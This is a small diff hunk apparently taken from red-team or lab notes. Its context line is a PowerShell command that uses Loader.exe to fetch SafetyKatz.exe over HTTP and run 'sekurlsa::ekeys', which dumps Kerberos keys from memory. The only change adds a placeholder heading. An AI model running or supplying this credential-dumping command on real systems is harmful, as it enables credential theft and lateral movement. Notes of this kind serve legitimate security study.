@@ -35,3 +35,5 @@ Use loader.exe
 ```powershell
 C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
 ```
+
+### **titolo**
